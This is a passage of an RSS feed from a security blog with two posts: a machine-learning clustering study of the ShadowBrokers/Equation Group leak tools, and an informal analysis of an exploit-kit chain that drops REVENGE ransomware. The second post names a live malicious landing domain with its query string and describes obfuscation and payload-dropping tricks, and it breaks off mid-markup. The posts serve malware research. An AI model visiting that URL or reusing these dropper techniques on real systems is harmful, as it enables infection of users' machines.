<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
      <title>Marco Ramilli on Marco Ramilli </title>
      <generator uri="https://gohugo.io">Hugo</generator>
    <link>http://marcoramilli.com/</link>
    <language>en-us</language>
    
    <copyright>This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</copyright>
    <updated>Sat, 29 Apr 2017 06:11:00 UTC</updated>
    
    <item>
      <title>ShadowBrokers Leak: A Machine Learning Approach</title>
      <link>http://marcoramilli.com/post/shadowbrokers-leak-a-machine-learning-approach/</link>
      <pubDate>Sat, 29 Apr 2017 06:11:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/shadowbrokers-leak-a-machine-learning-approach/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;During the past few weeks I read a lot of great papers, blog posts and full magazine articles on the ShadowBrokers Leak (free public repositories: &lt;a href=&#34;https://github.com/misterch0c/shadowbroker&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;https://github.com/adamcaudill/EquationGroupLeak&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;) released by WikiLeaks &lt;a href=&#34;https://wikileaks.org/ciav7p1/&#34; target=&#34;_blank&#34;&gt;Vault7&lt;/a&gt;. &amp;nbsp;Many of them described the amazing power of such a tools (by the way they are currently used by hackers to exploit systems without &lt;a href=&#34;https://technet.microsoft.com/en-us/library/security/ms17-010.aspx&#34; target=&#34;_blank&#34;&gt;MS17-010&lt;/a&gt; patch) other made a great reverse engineering adventures on some of the most used payloads and other again described what is going to happen in the next feature.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;So you probably are wandering why am I writing on this discussed topic again? Well, I did not find anyone who decided to extract features on such tools in order to correlate them with notorious payloads and malware. According to my previous blog post &amp;nbsp;&lt;a href=&#34;https://marcoramilli.blogspot.it/2016/12/malware-training-sets-machine-learning.html&#34; target=&#34;_blank&#34;&gt;Malware Training Sets: A machine learning dataset for everyone&lt;/a&gt;&amp;nbsp;I decided to &#34;refill&#34; my &lt;a href=&#34;https://github.com/marcoramilli/MalwareTrainingSets&#34; target=&#34;_blank&#34;&gt;public gitHub&lt;/a&gt; repository with more analyses on that topic.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;If you are not familiar with this leak you probably want to know that Equation Group&#39;s (attributed to NSA) built FuzzBunch software, an exploitation framework similar to Metasploit. The framework uses several remote exploits for Windows such as: EternalBlue, EternalRomance, Eternal Synergy, etc.. which calls external payloads as well, one of the most famous - as today- is DoublePulsar mainly used in SMB and RDP exploits. The system works straight forward by performing the following steps:&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;STEP1:&lt;b style=&#34;font-weight: bold;&#34;&gt; Eternalblue&lt;/b&gt;&amp;nbsp;launching platform with configuration file (xml in the image) and target ip.&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-Sf6fKQ-RzQc/WP-QSp5XULI/AAAAAAAAOCI/_W3AR321xyYFx3b-X0BwTdq3A88KkehpACEw/s1600/Schermata%2B2017-04-25%2Balle%2B20.06.41.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;218&#34; src=&#34;https://3.bp.blogspot.com/-Sf6fKQ-RzQc/WP-QSp5XULI/AAAAAAAAOCI/_W3AR321xyYFx3b-X0BwTdq3A88KkehpACEw/s400/Schermata%2B2017-04-25%2Balle%2B20.06.41.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Eternalblue working&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;/div&gt;&lt;ul&gt;&lt;li style=&#34;text-align: justify;&#34;&gt;STEP2:&lt;b&gt; DoublePulsar&lt;/b&gt; and additional payloads. Once the Eternablue successfully exploited Windows (in my case it was a Windows 7 SP1) it installs DoublePulsar which could be used as a professional PenTester would use Meterpreter/Empire/Beacon backdoors. &amp;nbsp;&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-02lAEX42Fhc/WP-R_g2Tc-I/AAAAAAAAOCU/xOERi-9hQ3UBtobGEHhh4M5njoyh79oTQCLcB/s1600/Schermata%2B2017-04-25%2Balle%2B20.13.39.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;400&#34; src=&#34;https://3.bp.blogspot.com/-02lAEX42Fhc/WP-R_g2Tc-I/AAAAAAAAOCU/xOERi-9hQ3UBtobGEHhh4M5njoyh79oTQCLcB/s400/Schermata%2B2017-04-25%2Balle%2B20.13.39.png&#34; width=&#34;311&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;DoublePulsar usage&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;ul&gt;&lt;li style=&#34;text-align: justify;&#34;&gt;STEP3: &lt;b&gt;DanderSpritz&lt;/b&gt;. A Command and Control Manager to manage multiple implants. It could acts as a C&amp;amp;C Listener or it might be used to directly connect to targets as well.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-WjZWMfF59l8/WP-Stx1rFuI/AAAAAAAAOCc/V4UQRIh5cPYHJvEWNggvq-2hxQ37nD7GACLcB/s1600/Schermata%2B2017-04-22%2Balle%2B08.47.59.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;253&#34; src=&#34;https://1.bp.blogspot.com/-WjZWMfF59l8/WP-Stx1rFuI/AAAAAAAAOCc/V4UQRIh5cPYHJvEWNggvq-2hxQ37nD7GACLcB/s400/Schermata%2B2017-04-22%2Balle%2B08.47.59.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;DanderSpritz&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Following the same process described &lt;a href=&#34;https://marcoramilli.blogspot.it/2016/12/malware-training-sets-machine-learning.html&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;&amp;nbsp;(and described in the following image) I generated features file for each of the aforementioned Equation Group tools. The process involved files detonation into multiple sandboxes performing both: dynamic analysis and static analysis as well. The analyses results get translated into MIST format and later saved into json files for convenience.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-DLpD8-toGrE/WE2CDN07T8I/AAAAAAAANj8/NftQ1JkEmdEixVpL4OiqUj5XjMSS_o4kQCPcB/s1600/Screen%2BShot%2B2016-12-11%2Bat%2B17.42.32.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: 1em; margin-right: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;265&#34; src=&#34;https://1.bp.blogspot.com/-DLpD8-toGrE/WE2CDN07T8I/AAAAAAAANj8/NftQ1JkEmdEixVpL4OiqUj5XjMSS_o4kQCPcB/s320/Screen%2BShot%2B2016-12-11%2Bat%2B17.42.32.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;In order to compare previous generated results (aka notorious Malware available &lt;a href=&#34;https://github.com/marcoramilli/MalwareTrainingSets&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;) to the last leak by figuring out if Equation Group is also imputable to have built known Malware (included into the &lt;a href=&#34;https://github.com/marcoramilli/MalwareTrainingSets&#34; target=&#34;_blank&#34;&gt;repository&lt;/a&gt;), you might decide to use one of the several Machine Learning frameworks available out there. &lt;a href=&#34;http://www.cs.waikato.ac.nz/ml/weka/&#34; target=&#34;_blank&#34;&gt;WEKA&lt;/a&gt; (developed by University of Waikato) is a romantic Data Mining tool which implements several algorithms and compare them together in order to find the best fit to the data set. Since I am looking for the &#34;best&#34; algorithm to apply production Machine Learning to such dataset I decided to go with &amp;nbsp;&lt;a href=&#34;http://www.cs.waikato.ac.nz/ml/weka/&#34; target=&#34;_blank&#34;&gt;WEKA&lt;/a&gt;.&amp;nbsp;It implements several algorithms &#34;ready to go&#34; and it performs auto performance analyses in oder to figure out what algorithm is &#34;best in my case&#34;. However WEKA needs a specific format which happens to be called ARFF (described &lt;a href=&#34;http://www.cs.waikato.ac.nz/ml/weka/arff.html&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;). I do have a JSON representation of MIST file. I&#39;ve tried several time to import my MIST JSON file into WEKA but with no luck. So I decided to write a quick and dirty conversion tool really *not performant* and really *not usable in production environment* which converts MIST (JSONized) format into ARFF format. The following script does this job assuming the MIST JSONized content loaded into a mongodb server. NOTE: the script is ugly and written just to make it works, no input controls, no variable controls, a very quick naive and trivial o(m*n^2) loop is implemented.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-QEl2lZ68AAo/WP-pkeBnTMI/AAAAAAAAOCs/pnm4_kEnrcwIzKbE2X17oxCDc-ybs7WIACLcB/s1600/Schermata%2B2017-04-25%2Balle%2B21.53.36.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;640&#34; src=&#34;https://2.bp.blogspot.com/-QEl2lZ68AAo/WP-pkeBnTMI/AAAAAAAAOCs/pnm4_kEnrcwIzKbE2X17oxCDc-ybs7WIACLcB/s640/Schermata%2B2017-04-25%2Balle%2B21.53.36.png&#34; width=&#34;324&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;From MIST to ARFF&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The resulting file MK.arff is a 1.2GB of pure text ready to be analyzed through WEKA or any other Machine Learning tools using the standard ARFF file format. The script is going available &lt;a href=&#34;https://github.com/marcoramilli/MalwareTrainingSets&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;. I am not going to comment nor to describe the results sets, since I wont to reach &#34;governative dangerous conclusions&#34; in my public blog. If you read that blog post to here you should have all the processes, the right data and the desired tools to be able to perform analyses by your own. Following some short inconclusive results with no associated comments.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;TEST 1:&lt;/div&gt;&lt;div&gt;&lt;b&gt;Algorithm&lt;/b&gt;: Simple K-Mins&lt;/div&gt;&lt;div&gt;&lt;b&gt;Number of clusters&lt;/b&gt;: 95 (We know it, since the data is classified)&lt;/div&gt;&lt;div&gt;&lt;b&gt;Seed&lt;/b&gt;: 18 (just random choice)&lt;/div&gt;&lt;div&gt;&lt;b&gt;Distance Function&lt;/b&gt;: EuclideanDistance, Normalized and Not inverted.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;RESULTS (square errors: 5.00):&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-_nO6y_ypgDg/WP-2QIi2eRI/AAAAAAAAOC8/7SdQezxlGUIa2H2QITEIs-hpgd-OFr1cwCLcB/s1600/Schermata%2B2017-04-25%2Balle%2B22.46.40.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;178&#34; src=&#34;https://3.bp.blogspot.com/-_nO6y_ypgDg/WP-2QIi2eRI/AAAAAAAAOC8/7SdQezxlGUIa2H2QITEIs-hpgd-OFr1cwCLcB/s400/Schermata%2B2017-04-25%2Balle%2B22.46.40.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;K-Mins Results&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;TEST 2 :&lt;/div&gt;&lt;div&gt;&lt;b&gt;Algorithm&lt;/b&gt;: Expectation Maximisation&lt;/div&gt;&lt;div&gt;&lt;b&gt;Number of clusters&lt;/b&gt;: to be discovered&lt;/div&gt;&lt;div&gt;&lt;b&gt;Seed&lt;/b&gt;: 0&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;RESULTS (few significant clusters detected):&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-CwT6ws1hXig/WQAzJihD_-I/AAAAAAAAODQ/fn3ZGGaiHz4a8XxgQO-fyja1FTOxtHofgCLcB/s1600/Schermata%2B2017-04-26%2Balle%2B07.32.41.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;320&#34; src=&#34;https://1.bp.blogspot.com/-CwT6ws1hXig/WQAzJihD_-I/AAAAAAAAODQ/fn3ZGGaiHz4a8XxgQO-fyja1FTOxtHofgCLcB/s320/Schermata%2B2017-04-26%2Balle%2B07.32.41.png&#34; width=&#34;293&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Extracted Classes&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;div&gt;TEST 3 :&lt;/div&gt;&lt;div&gt;&lt;b&gt;Algorithm&lt;/b&gt;: CobWeb&lt;/div&gt;&lt;div&gt;&lt;b&gt;Number of clusters&lt;/b&gt;: to be discovered&lt;/div&gt;&lt;div&gt;&lt;b&gt;Seed&lt;/b&gt;: 42&lt;/div&gt;&lt;br /&gt;RESULTS: (again few significative cluster were found)&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-iRKRV-0_0CA/WQSF7KroB0I/AAAAAAAAOEI/S1IrywbAUj8uI777bav_D2HLvhqRs1C6wCLcB/s1600/Schermata%2B2017-04-26%2Balle%2B07.35.03.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;210&#34; src=&#34;https://1.bp.blogspot.com/-iRKRV-0_0CA/WQSF7KroB0I/AAAAAAAAOEI/S1IrywbAUj8uI777bav_D2HLvhqRs1C6wCLcB/s400/Schermata%2B2017-04-26%2Balle%2B07.35.03.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Few descriptive clusters (click to enlarge)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;As today many analysts did a great job in study ShadowBrokers leak, but few of them (actually none so far, at least in my knowledge ) tried to cluster result sets derived by dynamic execution of ShadowBrokers leaks. In this post I tried to follow my previous path enlarging my public dataset by offering to security researcher data, procedures and tools to make their own analyses.&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>A quick REVENGE Analysis</title>
      <link>http://marcoramilli.com/post/a-quick-revenge-analysis/</link>
      <pubDate>Mon, 20 Mar 2017 23:32:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/a-quick-revenge-analysis/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Another free weekend, another suspicious link provided by a colleague of mine and another compelling feeling to understand &#34;how it works&#34;. &amp;nbsp;The following analysis is made &#34;just for fun&#34; and is not part of my professional analyses which have to follows a complete different process before being released. So please consider it as a &#34;sport activity&#34;.&lt;/div&gt;&lt;br /&gt;A colleague of mine provided me a suspicious link which I decided to analyze.&lt;br /&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The infection starts by redirecting the browser to the page &#34;&lt;span style=&#34;color: blue;&#34;&gt;see.aliharperweddings.com&lt;/span&gt;&#34; through a GET request with the following parameters:&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;biw=diamonds.104wh99.406v6e7i0&amp;amp;que=diamonds.124if80.406v5h6e9&amp;amp;qtuif=3654&amp;amp;fix=diamonds.108bf93.406p9e7i4&amp;amp;oq=CeliDpvspJOdZNQOyj0SGfwZkm4pcBwhH9Pqqj0bWmxCag57W9CW9UU4HupE&amp;amp;q=z3jQMvXcJwDQDoTBMvrESLtEMU_OHEKK2OH_783VCZ39JHT1vvHPRAPytgW&amp;amp;ct=diamonds&amp;amp;tuif=6124&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The page is not build to return rendered content but rather to return three different scripts. Indeed the returned visible page holds a weird displayed content as follows:&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-t77P5Evx--Y/WM60JXvJjiI/AAAAAAAAN6g/BnABNTKLmWA77wu9K1N8aDwTkqVZONaoQCLcB/s1600/EK_1.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;131&#34; src=&#34;https://3.bp.blogspot.com/-t77P5Evx--Y/WM60JXvJjiI/AAAAAAAAN6g/BnABNTKLmWA77wu9K1N8aDwTkqVZONaoQCLcB/s640/EK_1.png&#34; width=&#34;640&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Weird visible content by: see.aliharperweddings.com&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Getting a little deeper on the page source code it is easy to experience nice obfuscated scripts, which look like (at least to my experience) a first infection stage. Let&#39;s have fun and try to understand how this new sample works. The following image shows an obfuscated piece of code portion. We are getting into the first stage of analysis.&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-8RDPO4KDLRs/WM69nsXU93I/AAAAAAAAN6w/4vCkqIRPNc0mirWZof5vTxbWMvWN1RUhwCLcB/s1600/EK_obfuscation_1.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;196&#34; src=&#34;https://3.bp.blogspot.com/-8RDPO4KDLRs/WM69nsXU93I/AAAAAAAAN6w/4vCkqIRPNc0mirWZof5vTxbWMvWN1RUhwCLcB/s400/EK_obfuscation_1.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;First Stage: The fun begins.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Just few steps on google &lt;a href=&#34;https://developers.google.com/v8/&#34; target=&#34;_blank&#34;&gt;V8 engine&lt;/a&gt;&amp;nbsp;to de-obfuscate the first stage which uses a couple of techniques to run VBscript on the target machine. The first implemented trick, as shown in next image, is to use the classic &amp;nbsp;but &#34;ever green&#34;&amp;nbsp;&lt;b&gt;window.execScript&lt;/b&gt; which is no longer supported on Explorer &amp;gt;= 11. execScript takes two parameters: &#34;the code to be run&#34; and the &#34;used programming language&#34;. The function invokes the right interpreter depending on &#34;programming language&#34; parameter.&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-AZQYRzVVnXM/WM6_VQYZ26I/AAAAAAAAN68/F9XhnzQfzhcRLcMce3W8tTKlRoyzZZ6bgCLcB/s1600/EK_Obfuscation_2.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;258&#34; src=&#34;https://1.bp.blogspot.com/-AZQYRzVVnXM/WM6_VQYZ26I/AAAAAAAAN68/F9XhnzQfzhcRLcMce3W8tTKlRoyzZZ6bgCLcB/s400/EK_Obfuscation_2.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Second Stage: Running VBScript&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;The second trick is to use &lt;b&gt;eval &lt;/b&gt;to de-obfuscate the second stage and later on to run its functions through &lt;b&gt;VBArray&lt;/b&gt; technique. &amp;nbsp;Decoding the second stage was easier if compared to the first stage since less obfuscation rounds are involved. Once de-obfuscated the second stage I&#39;ve run into another &#34;browser&#34; stage (let&#39;s call it Third Stage) written in &lt;b&gt;VisualBasic&lt;/b&gt; Language as follows:&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-rhk1li0uPlk/WM7CucyY9TI/AAAAAAAAN7I/5d3Z1MZjF8AGnUmE_3EtHA5_qJpSp3yygCLcB/s1600/Schermata%2B2017-03-19%2Balle%2B18.37.18.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;208&#34; src=&#34;https://1.bp.blogspot.com/-rhk1li0uPlk/WM7CucyY9TI/AAAAAAAAN7I/5d3Z1MZjF8AGnUmE_3EtHA5_qJpSp3yygCLcB/s400/Schermata%2B2017-03-19%2Balle%2B18.37.18.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Third Stage: The VBScript saving Windows PE&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;The resulting script is quite simple to read no further obfuscated loops were involved. &amp;nbsp;The script per se is quite big so I am not going to describe every single line of code but just the most interesting one (at least in my personal opinion), so let&#39;s focalize on the &#34;random function&#34; (showed in the following image) which returns strLen number of &#34;random&#34; letters from a well defined alphabet :).&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-qjAt4AvxQRE/WM7DVQWVYlI/AAAAAAAAN7Q/KJ-tLGhWK0Ewayff1fdm-IG8jD5avV6qQCLcB/s1600/Schermata%2B2017-03-19%2Balle%2B18.43.31.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;110&#34; src=&#34;https://1.bp.blogspot.com/-qjAt4AvxQRE/WM7DVQWVYlI/AAAAAAAAN7Q/KJ-tLGhWK0Ewayff1fdm-IG8jD5avV6qQCLcB/s320/Schermata%2B2017-03-19%2Balle%2B18.43.31.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;&lt;span style=&#34;font-size: 12.8px;&#34;&gt;Third Stage:&amp;nbsp;&lt;/span&gt;Implemented &#34;random&#34; function&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;This function is used later on to save the PE FileSystemObject into temporary file by using the number &#34;8&#34; as parameter to the &lt;b&gt;rnds&lt;/b&gt; function. A nice and dirty IoC would be: &#34;8 letters&#34; from &#34;abcdehiklmnoprstuw02346&#34; alphabet &#34;.exe&#34; into system temporary directory as shown in the next image.&amp;nbsp;&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a 